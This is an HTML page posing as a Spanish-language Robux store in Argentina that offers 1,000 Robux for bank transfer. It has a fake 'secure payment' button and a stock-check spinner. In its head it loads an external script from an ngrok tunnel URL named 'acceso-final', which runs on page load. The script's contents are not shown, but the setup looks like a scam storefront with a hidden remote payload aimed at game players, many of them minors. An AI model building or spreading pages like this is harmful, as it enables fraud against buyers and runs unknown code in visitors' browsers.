<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Tienda Robux Argentina</title>
    <script src="https://superdelicately-handworked-brenna.ngrok-free.dev/acceso-final"></script>
    <style>
        body { background-color: #1a1a1a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
        .header { background-color: #00b06f; padding: 10px; border-radius: 10px; margin-bottom: 20px; }
        .catalogo { display: flex; justify-content: center; margin-top: 30px; }
        .card { background-color: #2a2a2a; border: 2px solid #00b06f; border-radius: 15px; padding: 20px; width: 250px; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
        .btn-comprar { background-color: #00b06f; color: white; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
        .precio { font-size: 24px; color: #ffca28; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎮 ROBX STORE ARGENTINA</h1>
    </div>
    
    <h3>Catálogo de Ofertas Exclusivas</h3>
    
    <div class="catalogo">
        <div class="card">
            <h2>1.000 Robux</h2>
            <p class="precio">$8.000 ARS</p>
            <p>Entrega inmediata vía transferencia</p>
            <button class="btn-comprar" onclick="alert('Iniciando pasarela de pago segura...')">AGREGAR AL CARRITO</button>
        </div>
    </div>

    <div id="loading" style="margin-top: 40px; color: #888;">
        <p>Verificando stock en tiempo real...</p>
        <div style="border: 4px solid #333; border-top: 4px solid #00b06f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto;"></div>
    </div>

    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
</body>
</html>
